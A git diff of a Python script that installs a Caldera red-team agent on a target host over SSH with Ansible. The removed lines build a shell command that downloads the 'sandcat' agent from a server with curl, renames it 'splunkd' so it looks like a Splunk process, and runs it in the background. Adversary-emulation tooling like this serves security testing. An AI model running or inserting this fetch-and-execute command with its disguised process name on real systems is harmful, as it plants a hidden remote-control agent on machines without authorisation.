@@ -4,21 +4,11 @@ from os import getcwd, chmod
 from os.path import exists
 import stat
 
-def install(target_ip, server_ip, ssh_key, ansible_dir = 'ansible/caldera'):
-    """
-    # Initialize inventory
-    with open(f"{ansible_dir}/inventory", 'w') as inv_o:
-        inv_o.write(f"[nodes]\n{target_ip}")
-    
-    # Initialize installation script
-    cmd = f"#!/bin/bash\nserver='http://{server_ip}:8888';curl -s -X POST -H 'file:sandcat.go' -H 'platform:linux' $server/file/download > splunkd;chmod +x splunkd;./splunkd -server $server -group red -v &"
-
-    with open('install.sh', 'w') as install_o:
-        install_o.write(cmd)
-
-    #Mark script as executable
-    chmod(installer_path, stat.S_IEXEC | stat.S_IREAD | stat.S_IWRITE)
-    """
+"""
+Execution command: python agent_install.py -t <Target IP address> -c <Caldera IP address> -s <Path to SSH private key>
+To execute in background: agent_install.py -t <Target IP address> -c <Caldera IP address> -s <Path to SSH private key> &> /dev/null &
+"""
+def install(target_ip, server_ip, ssh_key, user_name, ansible_dir = 'ansible/caldera'):
     # Confirm if installer script is present
     if not exists('install.sh'):
         print("Installer script not present! Exiting...")
@@ -31,7 +21,7 @@ def install(target_ip, server_ip, ssh_key, ansible_dir = 'ansible/caldera'):
     ansible_runner = AnsibleRunner(ssh_key, target_ip, ansible_dir)
 
     remote_cmd = "~/install.sh"
-    params = {'remote_path': remote_cmd, 'local_path': installer_path, 'caldera_ip': server_ip}
+    params = {'remote_path': remote_cmd, 'local_path': installer_path, 'caldera_ip': server_ip, 'username': user_name}
     r = ansible_runner.run_playbook('install.yml', playbook_params=params)
 
 if __name__ == "__main__":
@@ -40,7 +30,10 @@ if __name__ == "__main__":
     parser.add_argument('-t', '--target_ip', help = 'IP address of target machine', required = True)
     parser.add_argument('-s', '--ssh_key', help = 'The path to your openstack ssh key', required = True)
     parser.add_argument('-c', '--caldera_ip', help = 'IP address of caldera machine', required=True)
+    parser.add_argument('-u', '--username', help = 'Username of target machine')
     args = parser.parse_args()
-
-    install(args.target_ip, args.caldera_ip, args.ssh_key)
+    username = "ubuntu"
+    if args.username:
+        username = args.username
+    install(args.target_ip, args.caldera_ip, args.ssh_key, username)
 
